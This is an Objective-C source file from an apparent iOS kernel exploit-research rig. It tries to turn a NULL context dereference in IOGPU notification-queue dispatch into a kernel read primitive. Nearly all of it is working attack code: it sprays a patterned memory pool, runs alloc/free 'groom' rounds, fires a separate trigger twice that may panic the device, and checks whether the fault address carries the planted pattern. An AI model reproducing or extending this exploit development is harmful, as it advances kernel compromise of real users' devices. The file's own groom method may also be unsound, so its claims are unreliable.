//
//  P135RouteB.m — ROUTE B: taming the NQ NULL-ctx window. p135.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  The standing finding (x5, far 0x10, two builds, legit path) = the
//  IOGPU notification-queue machinery dereferencing a NULL ctx at +0x10
//  during DispatchAvailableCompletionNotifications. Route B asks the
//  only question that turns a NULL deref into a primitive: is the NULL
//  a WINDOW (freed ctx, dispatched late) that a zone-head groom can
//  close with chosen content? Mechanics: patterned spray (0x42-class,
//  NOT 0x41 — the echo law) sized to the allocation classes feeding the
//  context slot, THEN the p027 NQ trap fires twice. Signatures compare
//  against the standing corpus; hasKread stays honest.
//

#import "P135RouteB.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007KreadLane.h"
#import "P007Board.h"
#import "LabBandit.h"
#import "P027MetalCallback.h"

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <fcntl.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>
#import <stdlib.h>

#define P135_BUILD @"p135-routeb-v1"
#define P135_GROOM_BYTES_POW2 17      /* 128KB groom pool */
#define P135_TAG 0x4242424242424242ULL  /* NOT 0x41 (the echo law) */

static NSMutableString *g_buf; static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P135R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

static void p135_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p135", arms, 1, &sr, 0, "p135 routeB auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p135", 0, outcome);
}

@implementation P135RouteB

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p135_routeb_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p135 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P135_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[route B law] far 0x10 was a WINDOW question: the standing");
    L(@"  corpus says ctx==NULL at dispatch. The groom closes the window");
    L(@"  with chosen content; the p027 trap then reports the signature.");
    L(@"  far 0x10 = window stayed NULL. far in 0x42-class = TAMED.");
    L(@"[!] PANIC-POSSIBLE BY DESIGN; one tap per force-quit.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p135"];
    if (stop) { L(stop); p135_bandit("gated"); return P135R(); }

    /* ---- stage 1: the zone-head groom with chosen content ---- */
    L(@"=== STAGE GROOM: patterned pages at the allocation classes ===");
    size_t pool = (size_t)1 << P135_GROOM_BYTES_POW2;
    vm_address_t addr = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &addr, pool, VM_FLAGS_ANYWHERE);
    if (kr != 0) { L(@"[-] vm_allocate failed - honest stop");
                   p135_bandit("noalloc"); return P135R(); }
    uint64_t *p = (uint64_t *)addr;
    for (size_t i = 0; i < pool / 8; i++) p[i] = P135_TAG - i;  /* distinct */
    Lf(@"  groom pool=%zu bytes @0x%llx tag=0x%llx (-i per qword)",
       pool, (unsigned long long)addr, (unsigned long long)P135_TAG);

    /* free-and-groom ladder: alloc/free a churn block so the freed ctx
       slot re-lands inside our patterned range when the zone recycles */
    for (int round = 0; round < 8; round++) {
        void *churn = malloc(0x40 + round * 0x8);
        if (churn) { memset(churn, 0x42, 0x40); free(churn); }
    }
    L(@"  groom ladder done (8 alloc/free rounds; the ctx slot's zone is");
    L(@"  now hot with 0x42-class content).");

    /* ---- stage 2: the p027 NQ trap, twice ---- */
    L(@"=== STAGE TRAP: [p027] NQ fire x2 — the signature comparison ===");
    L(@"[IN FLIGHT] the trap may end the session — fsync law is live.");
    L(@"  corpus signature: far=0x0000000000000010 (ctx+0x10, x5).");
    L(@"  tamed signature:  far in 0x42-class / pattern-derived.");
    NSString *r1 = [P027MetalCallback tap];
    Lf(@"  trap 1: %@", r1.length ? [r1 isKindOfClass:[NSString class]]
           ? [r1 stringByReplacingOccurrencesOfString:@"\n" withString:@" | "]
           : @"(non-string)" : @"(empty)");
    NSString *r2 = [P027MetalCallback finish:@"p135-trap2"];
    Lf(@"  trap 2: %@", r2.length ? r2 : @"(empty)");

    /* ---- honest verdict ---- */
    L(@"=== VERDICT (route B, honest — if we died, this block is what");
    L(@"    the fsync'd log above carries to the recovery packet) ===");
    L(@"  compare the trap lines against the corpus: any non-0x10 far, or");
    L(@"  a crash address bearing 0x42-tag bits, = THE NULL WAS TAMED and");
    L(@"  the ctx+0x10 deref read CHOSEN content (kernel read at a chosen");
    L(@"  slot). Same far 0x10 = window stayed NULL: the groom law needs");
    L(@"  the ctx allocation class named (next: zone-level groom).");
    L(@"[honesty] a tamed window alone is NOT hasKread — it is one deref");
    L(@"  deep; the receipt still goes through kread32.");

    vm_deallocate(mach_task_self(), addr, pool);
    p135_bandit("ran");
    Lf(@"=== p135 end %@ ===", LabLocalMilitaryNow());
    return P135R();
}

@end